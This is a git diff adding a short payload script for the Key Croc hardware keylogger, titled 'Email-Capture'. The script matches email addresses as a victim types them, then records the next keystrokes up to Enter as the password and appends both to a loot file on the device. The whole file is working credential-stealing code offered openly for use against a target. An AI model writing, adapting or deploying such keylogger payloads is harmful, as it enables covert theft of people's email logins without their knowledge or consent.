@@ -1,0 +1,34 @@
+# Title:         Email-Capture
+# Description:   Capture target E-mail address & password save to /udisk/tools/target_email.txt
+# Author:        Spywill
+# Version:       1.0
+# Category:      Key Croc
+
+MATCH (^[a-zA-Z0-9_\-\.]+@[a-zA-Z0-9_\-\.]+\.[a-zA-Z]{3,5}$)
+
+pattern='^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{3,5})$'
+
+EMAIL_PASS() {
+	until [ -f /tmp/target_email_pw.txt.filtered ]; do
+		:
+	done
+	LED G
+	sleep 3
+	LED OFF
+	cat /tmp/target_email_pw.txt.filtered >> /root/udisk/tools/target_email.txt
+	rm /tmp/target_email_pw.txt /tmp/target_email_pw.txt.filtered
+	RELOAD_PAYLOADS
+}
+
+if [[ "$LOOT" =~ $pattern ]]; then
+	LED B
+	echo "$LOOT" >> /root/udisk/tools/target_email.txt
+else
+	LED R
+fi
+
+sleep 3
+LED OFF
+
+SAVEKEYS /tmp/target_email_pw.txt UNTIL ENTER
+EMAIL_PASS
